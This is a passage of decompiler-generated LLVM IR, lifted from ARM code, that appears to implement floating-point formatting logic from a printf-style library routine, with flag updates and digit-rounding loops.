  br i1 %v7_f66c, label %dec_label_pc_f668.dec_label_pc_f5d4_crit_edge, label %dec_label_pc_f674

dec_label_pc_f668.dec_label_pc_f5d4_crit_edge:    ; preds = %dec_label_pc_f668
  %v0_f5d4.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_f5d8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f5d4

dec_label_pc_f674:                                ; preds = %dec_label_pc_f668
  %v0_f674 = load i32, i32* %sl.global-to-local, align 4
  %v1_f674 = add i32 %v0_f674, -96
  %v3_f674 = sub i32 95, %v0_f674
  %v4_f674 = and i32 %v3_f674, %v0_f674
  %v5_f674 = icmp slt i32 %v4_f674, 0
  store i1 %v5_f674, i1* %cpsr_v.global-to-local, align 1
  %v6_f674 = icmp slt i32 %v1_f674, 0
  store i1 %v6_f674, i1* %cpsr_n.global-to-local, align 1
  %v7_f674 = icmp eq i32 %v0_f674, 96
  store i1 %v7_f674, i1* %cpsr_z.global-to-local, align 1
  %tmp287 = icmp ult i32 %v0_f674, 97
  store i32 %v1_f6a4, i32* %ip.global-to-local, align 4
  br i1 %tmp287, label %bb229, label %thread-pre-split

bb229:                                            ; preds = %dec_label_pc_f674
  %v5_f684 = add i32 %v0_f674, 32
  store i32 %v5_f684, i32* %r3.global-to-local, align 4
  %v5_f688 = urem i32 %v5_f684, 256
  store i32 %v5_f688, i32* %sl.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_f674, %bb229
  %v0_f6ac = phi i32 [ %v5_f688, %bb229 ], [ %v0_f674, %dec_label_pc_f674 ]
  %stack_var_-58.0131138 = phi i32 [ 69, %bb229 ], [ 101, %dec_label_pc_f674 ]
  %v7_f68c = icmp eq i32 %v0_f6ac, 103
  %. = zext i1 %v7_f68c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f698 = icmp slt i32 %v1_f6a4, 0
  store i1 %v1_f698, i1* %cpsr_n.global-to-local, align 1
  %v2_f698 = icmp eq i32 %v1_f6a4, 0
  store i1 %v2_f698, i1* %cpsr_z.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_f6a4, 1
  br i1 %tmp232, label %.thread12, label %bb233

.thread12:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb235

bb233:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f6a0 = icmp eq i1 %v7_f68c, false
  store i1 %v2_f6a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6a0, label %bb235, label %bb234

bb234:                                            ; preds = %bb233
  %v2_f6a4 = add i32 %v1_f6a4, -1
  store i32 %v2_f6a4, i32* %ip.global-to-local, align 4
  br label %bb235

bb235:                                            ; preds = %.thread12, %bb233, %bb234
  %v0_f6a8 = phi i32 [ %v1_f6a4, %.thread12 ], [ %v1_f6a4, %bb233 ], [ %v2_f6a4, %bb234 ]
  %v1_f6ac = add i32 %v0_f6ac, -102
  %v3_f6ac = sub i32 101, %v0_f6ac
  %v4_f6ac = and i32 %v3_f6ac, %v0_f6ac
  %v5_f6ac = icmp slt i32 %v4_f6ac, 0
  store i1 %v5_f6ac, i1* %cpsr_v.global-to-local, align 1
  %v6_f6ac = icmp slt i32 %v1_f6ac, 0
  store i1 %v6_f6ac, i1* %cpsr_n.global-to-local, align 1
  %v7_f6ac = icmp eq i32 %v0_f6ac, 102
  store i1 %v7_f6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6ac, label %dec_label_pc_f6b8, label %bb236

bb236:                                            ; preds = %bb235
  store i32 %v0_f6a8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f6e4

dec_label_pc_f6b8:                                ; preds = %bb235
  store i32 %v0_f6a8, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-192.6, i32* %r1.global-to-local, align 4
  %v2_f6c0 = add i32 %v0_f6a8, %stack_var_-192.6
  store i32 %v2_f6c0, i32* %ip.global-to-local, align 4
  %v1_f6c4 = add i32 %v2_f6c0, 1
  %v3_f6c4 = sub i32 0, %v2_f6c0
  %v4_f6c4 = and i32 %v1_f6c4, %v3_f6c4
  %v5_f6c4 = icmp slt i32 %v4_f6c4, 0
  store i1 %v5_f6c4, i1* %cpsr_v.global-to-local, align 1
  %v6_f6c4 = icmp slt i32 %v1_f6c4, 0
  store i1 %v6_f6c4, i1* %cpsr_n.global-to-local, align 1
  %v7_f6c4 = icmp eq i32 %v1_f6c4, 0
  store i1 %v7_f6c4, i1* %cpsr_z.global-to-local, align 1
  %v2_f6c8 = xor i1 %v6_f6c4, %v5_f6c4
  br i1 %v2_f6c8, label %dec_label_pc_f6cc, label %dec_label_pc_f6e4

dec_label_pc_f6cc:                                ; preds = %dec_label_pc_f6b8
  %v2_f6cc = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_f6cc, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_f6d8 = bitcast i32* %stack_var_-79 to i8*
  %v3_f6d8 = call i32 @__GI_memset(i8* %v2_f6d8, i32 48)
  store i32 %v3_f6d8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f6e4

dec_label_pc_f6e4:                                ; preds = %bb236, %dec_label_pc_f6b8, %dec_label_pc_f6cc
  %v1_f72888 = phi i32 [ %v3_f6d8, %dec_label_pc_f6cc ], [ %v0_f6a8, %dec_label_pc_f6b8 ], [ %v2_f658, %bb236 ]
  %v1_f70c = phi i32 [ -1, %dec_label_pc_f6cc ], [ %v2_f6c0, %dec_label_pc_f6b8 ], [ %v0_f6a8, %bb236 ]
  %stack_var_-192.7 = phi i32 [ -1, %dec_label_pc_f6cc ], [ %stack_var_-192.6, %dec_label_pc_f6b8 ], [ %stack_var_-192.6, %bb236 ]
  %v1_f6e8 = add i32 %v1_f70c, -16
  %v3_f6e8 = sub i32 15, %v1_f70c
  %v4_f6e8 = and i32 %v3_f6e8, %v1_f70c
  %v5_f6e8 = icmp slt i32 %v4_f6e8, 0
  store i1 %v5_f6e8, i1* %cpsr_v.global-to-local, align 1
  %v6_f6e8 = icmp slt i32 %v1_f6e8, 0
  store i1 %v6_f6e8, i1* %cpsr_n.global-to-local, align 1
  %v7_f6e8 = icmp eq i32 %v1_f70c, 16
  store i1 %v7_f6e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_f6f4 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_f6f4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_f6fc = xor i1 %v6_f6e8, %v5_f6e8
  %v4_f6fc = or i1 %v7_f6e8, %v3_f6fc
  br i1 %v4_f6fc, label %dec_label_pc_f708, label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %dec_label_pc_f6e4
  store i32 0, i32* %r0.global-to-local, align 4
  %v7_f700152 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_f700152, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_f708:                                ; preds = %dec_label_pc_f6e4
  %v2_f708 = ptrtoint i32* %stack_var_-78 to i32
  %v2_f70c = add i32 %v1_f70c, %v2_f708
  store i32 %v2_f70c, i32* %r3.global-to-local, align 4
  %v1_f710 = add i32 %v2_f70c, 2
  %v2_f710 = inttoptr i32 %v1_f710 to i8*
  %v3_f710 = load i8, i8* %v2_f710, align 1
  %v4_f710 = zext i8 %v3_f710 to i32
  store i32 %v4_f710, i32* %r2.global-to-local, align 4
  store i32 %v1_f710, i32* %r1.global-to-local, align 4
  %v2_f718 = icmp ugt i8 %v3_f710, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_f718 = icmp ult i8 %v3_f710, 52
  store i1 %v6_f718, i1* %cpsr_n.global-to-local, align 1
  %v7_f718 = icmp eq i8 %v3_f710, 52
  store i1 %v7_f718, i1* %cpsr_z.global-to-local, align 1
  %v2_f71c = xor i1 %v2_f718, true
  %v3_f71c = or i1 %v7_f718, %v2_f71c
  br i1 %v3_f71c, label %bb237, label %bb238

bb237:                                            ; preds = %dec_label_pc_f708
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb238

bb238:                                            ; preds = %dec_label_pc_f708, %bb237
  %v1_f72886 = phi i32 [ %v1_f72888, %dec_label_pc_f708 ], [ 0, %bb237 ]
  %v2_f720 = xor i1 %v7_f718, true
  %v3_f720 = and i1 %v2_f718, %v2_f720
  br i1 %v3_f720, label %bb239, label %.preheader

bb239:                                            ; preds = %bb238
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb238, %bb239, %..preheader_crit_edge, %.backedge
  %v1_f728 = phi i32 [ %v1_f728.pre, %.backedge ], [ 0, %..preheader_crit_edge ], [ %v1_f72886, %bb238 ], [ 1, %bb239 ]
  %v0_f724 = phi i32 [ %v0_f730, %.backedge ], [ %v7_f700152, %..preheader_crit_edge ], [ %v1_f710, %bb238 ], [ %v1_f710, %bb239 ]
  %v1_f724 = add i32 %v0_f724, -1
  %v2_f724 = inttoptr i32 %v1_f724 to i8*
  %v3_f724 = load i8, i8* %v2_f724, align 1
  %v4_f724 = zext i8 %v3_f724 to i32
  store i32 %v1_f724, i32* %r1.global-to-local, align 4
  %v2_f728 = add i32 %v4_f724, %v1_f728
  store i32 %v2_f728, i32* %r3.global-to-local, align 4
  %v1_f72c = trunc i32 %v2_f728 to i8
  store i8 %v1_f72c, i8* %v2_f724, align 1
  %v0_f730 = load i32, i32* %r1.global-to-local, align 4
  %v1_f730 = inttoptr i32 %v0_f730 to i8*
  %v2_f730 = load i8, i8* %v1_f730, align 1
  %v3_f730 = zext i8 %v2_f730 to i32
  store i32 %v3_f730, i32* %r2.global-to-local, align 4
  %v2_f734 = icmp ugt i8 %v2_f730, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_f734 = icmp ult i8 %v2_f730, 57
  store i1 %v6_f734, i1* %cpsr_n.global-to-local, align 1
  %v7_f734 = icmp eq i8 %v2_f730, 57
  store i1 %v7_f734, i1* %cpsr_z.global-to-local, align 1
  %v2_f738 = xor i1 %v2_f734, true
  %v3_f738 = or i1 %v7_f734, %v2_f738
  br i1 %v3_f738, label %bb240, label %bb241

bb240:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb241

bb241:                                            ; preds = %.preheader, %bb240
  %v2_f73c = xor i1 %v7_f734, true
  %v3_f73c = and i1 %v2_f734, %v2_f73c
  br i1 %v3_f73c, label %bb242, label %._crit_edge

._crit_edge:                                      ; preds = %bb241
  %v1_f744.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb243

bb242:                                            ; preds = %bb241
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb243

bb243:                                            ; preds = %._crit_edge, %bb242
  %v1_f744 = phi i32 [ %v1_f744.pre, %._crit_edge ], [ 1, %bb242 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_f740 = icmp ult i8 %v2_f730, 48
  store i1 %v6_f740, i1* %cpsr_n.global-to-local, align 1
  %v7_f740 = icmp eq i8 %v2_f730, 48
  store i1 %v7_f740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f740, label %.thread17, label %bb244

.thread17:                                        ; preds = %bb243
  %v2_f744 = or i32 %v1_f744, 1
  store i32 %v2_f744, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f74818 = icmp slt i32 %v2_f744, 0
  store i1 %v1_f74818, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb244:                                            ; preds = %bb243
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f748 = icmp slt i32 %v1_f744, 0
  store i1 %v1_f748, i1* %cpsr_n.global-to-local, align 1
  %v2_f748 = icmp eq i32 %v1_f744, 0
  store i1 %v2_f748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f748, label %dec_label_pc_f750, label %.backedge

.backedge:                                        ; preds = %bb244, %.thread17
  %v1_f728.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_f750:                                ; preds = %bb244
  store i32 %v2_f6f4, i32* %r2.global-to-local, align 4
  %v2_f754 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_f754, i32* %r3.global-to-local, align 4
  %v2_f758 = sub i32 %v0_f730, %v2_f754
  %v3_f758 = icmp uge i32 %v0_f730, %v2_f754
  %v4_f758 = xor i32 %v0_f730, %v2_f754
  %v5_f758 = xor i32 %v2_f758, %v0_f730
  %v6_f758 = and i32 %v5_f758, %v4_f758
  %v7_f758 = icmp slt i32 %v6_f758, 0
  store i1 %v7_f758, i1* %cpsr_v.global-to-local, align 1
  %v8_f758 = icmp slt i32 %v2_f758, 0
  store i1 %v8_f758, i1* %cpsr_n.global-to-local, align 1
  %v9_f758 = icmp eq i32 %v0_f730, %v2_f754
  store i1 %v9_f758, i1* %cpsr_z.global-to-local, align 1
  %v2_f75c = xor i1 %v3_f758, true
  %v3_f75c = or i1 %v9_f758, %v2_f75c
  br i1 %v3_f75c, label %bb245, label %.thread162

bb245:                                            ; preds = %dec_label_pc_f750
  store i32 %v2_f754, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-192.7, i32* %r3.global-to-local, align 4
  store i32 %v2_f754, i32* %r1.global-to-local, align 4
  br label %.thread162

.thread162:                                       ; preds = %dec_label_pc_f750, %bb245
  %v4_f76c160 = phi i32 [ %stack_var_-192.7, %bb245 ], [ %v2_f754, %dec_label_pc_f750 ]
  %v2_f77c = phi i32 [ %v2_f754, %bb245 ], [ %v0_f730, %dec_label_pc_f750 ]
  %v4_f770154159 = phi i32 [ %v2_f754, %bb245 ], [ %v2_f6f4, %dec_label_pc_f750 ]
  %v2_f768 = xor i1 %v9_f758, true
  %v3_f768 = and i1 %v3_f758, %v2_f768
  br i1 %v3_f768, label %bb246, label %bb247

bb246:                                            ; preds = %.thread162
  store i32 %stack_var_-192.7, i32* %r0.global-to-local, align 4
  br label %bb247

bb247:                                            ; preds = %.thread162, %bb246
  br i1 %v3_f75c, label %bb248, label %bb249

bb248:                                            ; preds = %bb247
  %v5_f76c = add i32 %v4_f76c160, 1
  store i32 %v5_f76c, i32* %r0.global-to-local, align 4
  br label %bb249

bb249:                                            ; preds = %bb247, %bb248
  br i1 %v3_f768, label %bb250, label %bb251

bb250:                                            ; preds = %bb249
  %v5_f770 = add i32 %v4_f770154159, 2
  store i32 %v5_f770, i32* %r2.global-to-local, align 4
  br label %bb251

bb251:                                            ; preds = %bb249, %bb250
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f778 = load i32, i32* %sl.global-to-local, align 4
  %v1_f778 = add i32 %v0_f778, -103
  %v3_f778 = sub i32 102, %v0_f778
  %v4_f778 = and i32 %v3_f778, %v0_f778
  %v5_f778 = icmp slt i32 %v4_f778, 0
  store i1 %v5_f778, i1* %cpsr_v.global-to-local, align 1
  %v6_f778 = icmp slt i32 %v1_f778, 0
  store i1 %v6_f778, i1* %cpsr_n.global-to-local, align 1
  %v7_f778 = icmp eq i32 %v0_f778, 103
  store i1 %v7_f778, i1* %cpsr_z.global-to-local, align 1
  %v3_f77c = add i32 %v2_f77c, 1
  %v4_f77c = inttoptr i32 %v3_f77c to i8*
  store i8 0, i8* %v4_f77c, align 1
  %v0_f780 = load i32, i32* %r1.global-to-local, align 4
  %v1_f780 = add i32 %v0_f780, 1
  store i32 %v1_f780, i32* %r1.global-to-local, align 4
  %v0_f784 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f784, label %dec_label_pc_f788, label %dec_label_pc_f7b8

dec_label_pc_f788:                                ; preds = %bb251
  %v0_f788 = load i32, i32* %r0.global-to-local, align 4
  %v1_f788 = load i32, i32* %ip.global-to-local, align 4
  %v2_f788 = sub i32 %v0_f788, %v1_f788
  %v4_f788 = xor i32 %v1_f788, %v0_f788
  %v5_f788 = xor i32 %v2_f788, %v0_f788
  %v6_f788 = and i32 %v5_f788, %v4_f788
  %v7_f788 = icmp slt i32 %v6_f788, 0
  %v8_f788 = icmp slt i32 %v2_f788, 0
  %v9_f788 = icmp eq i32 %v0_f788, %v1_f788
  %v3_f78c = xor i1 %v8_f788, %v7_f788
  %v4_f78c = or i1 %v9_f788, %v3_f78c
  %.273 = zext i1 %v4_f78c to i32
  store i32 %.273, i32* %r3.global-to-local, align 4
  %v1_f794 = add i32 %v0_f788, 4
  %v3_f794 = sub i32 0, %v0_f788
  %v4_f794 = and i32 %v1_f794, %v3_f794
  %v5_f794 = icmp slt i32 %v4_f794, 0
  store i1 %v5_f794, i1* %cpsr_v.global-to-local, align 1
  %v6_f794 = icmp slt i32 %v1_f794, 0
  store i1 %v6_f794, i1* %cpsr_n.global-to-local, align 1
  %v7_f794 = icmp eq i32 %v1_f794, 0
  store i1 %v7_f794, i1* %cpsr_z.global-to-local, align 1
  %v2_f798 = xor i1 %v6_f794, %v5_f794
  br i1 %v2_f798, label %.thread21, label %bb254

.thread21:                                        ; preds = %dec_label_pc_f788
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread165

bb254:                                            ; preds = %dec_label_pc_f788
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f79c = icmp eq i1 %v4_f78c, false
  store i1 %v2_f79c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f79c, label %.thread165, label %bb255

.thread165:                                       ; preds = %bb254, %.thread21
  %v1_f7a43551 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_f7a43551, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f7c4

bb255:                                            ; preds = %bb254
  %v3_f7a0 = sub i32 %v1_f788, %v0_f788
  store i32 %v3_f7a0, i32* %ip.global-to-local, align 4
  store i32 102, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f7d0

dec_label_pc_f7b8:                                ; preds = %bb251
  %v0_f7b8 = load i32, i32* %sl.global-to-local, align 4
  %v1_f7b8 = add i32 %v0_f7b8, -102
  %v3_f7b8 = sub i32 101, %v0_f7b8
  %v4_f7b8 = and i32 %v3_f7b8, %v0_f7b8
  %v5_f7b8 = icmp slt i32 %v4_f7b8, 0
  store i1 %v5_f7b8, i1* %cpsr_v.global-to-local, align 1
  %v6_f7b8 = icmp slt i32 %v1_f7b8, 0
  store i1 %v6_f7b8, i1* %cpsr_n.global-to-local, align 1
  %v7_f7b8 = icmp eq i32 %v0_f7b8, 102
  store i1 %v7_f7b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_f7b8, i32* %r7.global-to-local, align 4
  br i1 %v7_f7b8, label %dec_label_pc_f7b8.dec_label_pc_f7d0_crit_edge, label %dec_label_pc_f7c4

dec_label_pc_f7b8.dec_label_pc_f7d0_crit_edge:    ; preds = %dec_label_pc_f7b8
  %v0_f7d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f7d0

dec_label_pc_f7c4:                                ; preds = %.thread165, %dec_label_pc_f7b8
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f7e0

dec_label_pc_f7d0:                                ; preds = %bb255, %dec_label_pc_f7b8.dec_label_pc_f7d0_crit_edge
  %v0_f7d0 = phi i32 [ %v0_f788, %bb255 ], [ %v0_f7d0.pre, %dec_label_pc_f7b8.dec_label_pc_f7d0_crit_edge ]
  %stack_var_-184.3 = phi i32 [ %v3_f7a0, %bb255 ], [ %v0_f6a8, %dec_label_pc_f7b8.dec_label_pc_f7d0_crit_edge ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f7d0 = icmp slt i32 %v0_f7d0, 0
  store i1 %v1_f7d0, i1* %cpsr_n.global-to-local, align 1
  %v2_f7d0 = icmp eq i32 %v0_f7d0, 0
  store i1 %v2_f7d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_f7d0, label %bb256, label %bb257

bb256:                                            ; preds = %dec_label_pc_f7d0
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_f7d8 = load i32, i32* %r2.global-to-local, align 4
  %v6_f7d8 = add i32 %v5_f7d8, -1
  %v7_f7d8 = inttoptr i32 %v6_f7d8 to i8*
  store i8 48, i8* %v7_f7d8, align 1
  %v8_f7d8 = load i32, i32* %r2.global-to-local, align 4
  %v9_f7d8 = add i32 %v8_f7d8, -1
  store i32 %v9_f7d8, i32* %r2.global-to-local, align 4
  %v0_f7dc.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_f80c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_f810.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_f810.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb257

bb257:                                            ; preds = %dec_label_pc_f7d0, %bb256
  %v1_f810.pre = phi i1 [ %v1_f810.pre.pre, %bb256 ], [ false, %dec_label_pc_f7d0 ]
  %v0_f810.pre = phi i1 [ %v0_f810.pre.pre, %bb256 ], [ false, %dec_label_pc_f7d0 ]
  %v1_f80c.pre = phi i32 [ %v1_f80c.pre.pre, %bb256 ], [ %v1_f780, %dec_label_pc_f7d0 ]
  %v0_f7dc = phi i32 [ %v0_f7dc.pre, %bb256 ], [ %v0_f7d0, %dec_label_pc_f7d0 ]
  store i32 %v0_f7dc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f7e0

dec_label_pc_f7e0:                                ; preds = %dec_label_pc_f7c4, %bb257
  %v0_f878 = phi i32 [ 0, %dec_label_pc_f7c4 ], [ %v0_f7dc, %bb257 ]
  %v1_f814 = phi i1 [ false, %dec_label_pc_f7c4 ], [ %v1_f810.pre, %bb257 ]
  %v0_f814 = phi i1 [ false, %dec_label_pc_f7c4 ], [ %v0_f810.pre, %bb257 ]
  %v1_f80c = phi i32 [ %v1_f780, %dec_label_pc_f7c4 ], [ %v1_f80c.pre, %bb257 ]
  %v1_f934 = phi i32 [ %v0_f6a8, %dec_label_pc_f7c4 ], [ %stack_var_-184.3, %bb257 ]
  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_f7ec = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_f7ec, i32* %r3.global-to-local, align 4
  %v0_f7f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_f7f8 = inttoptr i32 %v0_f7f8 to i8*
  %v2_f7f8 = load i8, i8* %v1_f7f8, align 1
  %v3_f7f8 = zext i8 %v2_f7f8 to i32
  store i32 %v3_f7f8, i32* %r3.global-to-local, align 4
  %v5_f7f8 = add i32 %v0_f7f8, 1
  store i32 %v5_f7f8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_f7f8, i32* %stack_var_-38, align 4
  %v2_f80c = sub i32 %v1_f80c, %v5_f7f8
  store i32 %v2_f80c, i32* %r1.global-to-local, align 4
  %v2_f810 = xor i1 %v1_f814, %v0_f814
  br i1 %v2_f810, label %.thread167, label %dec_label_pc_f818

.thread167:                                       ; preds = %dec_label_pc_f7e0
  %v5_f810 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_f810, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f888

dec_label_pc_f818:                                ; preds = %dec_label_pc_f7e0
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_f81c = sub i32 %v0_f878, %v2_f80c
  %v4_f81c = xor i32 %v2_f80c, %v0_f878
  %v5_f81c = xor i32 %v2_f81c, %v0_f878
  %v6_f81c = and i32 %v5_f81c, %v4_f81c
  %v7_f81c = icmp slt i32 %v6_f81c, 0
  store i1 %v7_f81c, i1* %cpsr_v.global-to-local, align 1
  %v8_f81c = icmp slt i32 %v2_f81c, 0
  store i1 %v8_f81c, i1* %cpsr_n.global-to-local, align 1
  %v9_f81c = icmp eq i32 %v0_f878, %v2_f80c
  store i1 %v9_f81c, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_f828 = xor i1 %v8_f81c, %v7_f81c
  br i1 %v2_f828, label %dec_label_pc_f864, label %dec_label_pc_f82c

dec_label_pc_f82c:                                ; preds = %dec_label_pc_f818
  store i32 %v2_f81c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_f81c, i1* %cpsr_n.global-to-local, align 1
  %v2_f830 = icmp eq i32 %v2_f81c, 0
  store i1 %v2_f830, i1* %cpsr_z.global-to-local, align 1
  %v2_f838 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_f838, i32* %lr.global-to-local, align 4
  %tmp258 = icmp slt i32 %v2_f81c, 1
  br i1 %tmp258, label %.thread169, label %dec_label_pc_f844

.thread169:                                       ; preds = %dec_label_pc_f82c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f884

dec_label_pc_f844:                                ; preds = %dec_label_pc_f82c
  store i32 ptrtoint (i32* @global_var_155a7.677 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_f850 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_f850, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_f888

dec_label_pc_f864:                                ; preds = %dec_label_pc_f818
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f864 = icmp slt i32 %v0_f878, 0
  store i1 %v1_f864, i1* %cpsr_n.global-to-local, align 1
  %v2_f864 = icmp eq i32 %v0_f878, 0
  store i1 %v2_f864, i1* %cpsr_z.global-to-local, align 1
  %v2_f868 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_f868, i32* %lr.global-to-local, align 4
  %tmp259 = icmp slt i32 %v0_f878, 1
  br i1 %tmp259, label %dec_label_pc_f884, label %dec_label_pc_f874

dec_label_pc_f874:                                ; preds = %dec_label_pc_f864
  %v2_f878 = sub i32 %v2_f80c, %v0_f878
  store i32 %v2_f878, i32* %r1.global-to-local, align 4
  %v2_f87c = add i32 %v5_f7f8, %v0_f878
  store i32 %v2_f87c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f884

dec_label_pc_f884:                                ; preds = %dec_label_pc_f874, %.thread169, %dec_label_pc_f864
  %storemerge181.in = phi i32* [ %stack_var_-152, %dec_label_pc_f864 ], [ %stack_var_-140, %.thread169 ], [ %stack_var_-140, %dec_label_pc_f874 ]
  %v0_f89c102 = phi i32 [ %v2_f80c, %dec_label_pc_f864 ], [ 0, %.thread169 ], [ %v2_f878, %dec_label_pc_f874 ]
  %storemerge181 = ptrtoint i32* %storemerge181.in to i32
  store i32 %storemerge181, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f888

dec_label_pc_f888:                                ; preds = %.thread167, %dec_label_pc_f844, %dec_label_pc_f884
  %v1_f8c0 = phi i32 [ %v2_f850, %dec_label_pc_f844 ], [ %storemerge181, %dec_label_pc_f884 ], [ %v5_f810, %.thread167 ]
  %v0_f8d8110 = phi i32 [ -1, %dec_label_pc_f844 ], [ -1, %dec_label_pc_f884 ], [ %v0_f878, %.thread167 ]
  %v0_f89c = phi i32 [ 0, %dec_label_pc_f844 ], [ %v0_f89c102, %dec_label_pc_f884 ], [ %v2_f80c, %.thread167 ]
  %v2_f888 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_f888, i32* %r2.global-to-local, align 4
  %v1_f88c = add i32 %v2_f888, 12
  %v2_f88c = inttoptr i32 %v1_f88c to i32*
  %v3_f88c = load i32, i32* %v2_f88c, align 4
  %v1_f890 = and i32 %v3_f88c, 16
  store i32 %v1_f890, i32* %lr.global-to-local, align 4
  %v2_f890 = icmp eq i32 %v1_f890, 0
  %tmp282 = zext i1 %v2_f890 to i32
  %.274 = xor i32 %tmp282, 1
  store i32 %.274, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f89c = icmp slt i32 %v0_f89c, 0
  store i1 %v1_f89c, i1* %cpsr_n.global-to-local, align 1
  %v2_f89c = icmp eq i32 %v0_f89c, 0
  store i1 %v2_f89c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f89c, label %bb262, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_f888
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f8bc

bb262:                                            ; preds = %dec_label_pc_f888
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_f890, i1* %cpsr_z.global-to-local, align 1
